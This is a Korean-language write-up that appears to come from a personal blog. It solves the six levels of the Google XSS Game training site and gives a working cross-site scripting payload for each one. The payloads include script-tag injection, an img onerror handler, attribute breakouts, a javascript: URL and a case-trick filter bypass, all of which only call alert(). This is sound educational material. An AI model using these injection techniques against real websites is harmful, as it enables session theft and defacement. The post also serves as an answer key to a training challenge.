---
title : Google XSS Game
categories: [Wargame]
---

## Google XSS Game 

<a href="https://xss-game.appspot.com/?utm_source=webopsweekly&utm_medium=email" target="_blank">Google XSS Game</a>

## Lv.1 Hello, world of XSS
```
입력값을 이스케이프 처리를 하지 않는다고 함. 

문제 클리어 조건은 alert()를 실행하면 됨.
```
```
<script>alert()</script>
```

## Lv.2 Persistence is key
```
<script>를 입력해보면 입력이 안됨.

결국 힌트를 보았음..

우선 defaultmessage를 보면 html tag를 사용 가능함을 알 수 있음.
html tag에는 error 발생 시 javascript를 실행시킬 수 있는 onerror라는 속성이 있음.
```
```
Example

Execute a JavaScript if an error occurs when loading an image:
<img src="image.gif" onerror="myFunction()">
```
```
따라서 onerror를 이용해 alert를 해주면 됨.

<img src="image.gif" onerror=alert()>
```

## Lv.3 That sinking feeling...
```
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
```
```
이 코드를 보면 num이 있는데 이곳이 입력값이 들어갈 부분임.  
이미지를 클릭해보면 url은 ```/frame/#1``` 이렇게 됨.  

위 코드에서 img 태그를 닫아버릴꺼임.

'/>로 닫아버리면 이미지 url을 보면 아래처럼 되서 에러 발생.
The requested URL /static/level3/cloud1 was not found on this server.

또한 이미지가 나타나던 부분에는 다음처럼 보여질꺼임.
Image 1
.jpg' />
```
```
따라서 img 태그를 닫아버리고 alert 스크립트를 추가해주면 됨.
```
```
/frame/#1'/><script>alert()</script>
```

## Lv.4 Context matters
```
<script>alert()</script>를 입력하면 문제 설명에도 있는 것처럼
이스케이프 처리가 되어버림.

onload 속성에서 여러 개를 주면 됨.
onload="alert('1'); alert('2')" -> 1 뜨고 2 뜸.
```
```
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
```
위 코드를 보면 ```timer``` 부분에 값이 들어가므로 여기에 alert를 주면 됨.
```
<img src="/static/loading.gif" onload="startTimer(''); alert('1');" />
```
위에 처럼 하면 함수 실행 후 alert('1')이 될꺼임.
```
?timer='); alert('
```
근데 안뜸 -> urlencode를 해봄.
```
?timer=')%3b alert(' -> 성공
```

## Lv.5 Breaking protocol
```
url javascript를 이용하면 됨. 
2번 풀 때 알게되었는데 이 때 쓰이네;

<a href="{{ next }}">Next >></a> 이 부분이 있는데
url을 보면 ?next=confirm으로 되어있을꺼임.

이 값을 바꾸면 됨.
```
```
?next=javascript:alert()
```

## Lv.6 Follow the 🐇
```
힌트에서 google.com/jsapi?callback=foo라고 되어있음.
아마도 함수를 호출해주는 건가 봄.

근데 문제에서 https://는 필터링함. 하지만 대소문자 구분은 하지 않음.
처음엔 ':'를 두 번 썼는데 안되어서 Https로 해주니 성공.
```
```
Https://www.google.com/jsapi?callback=alert
```
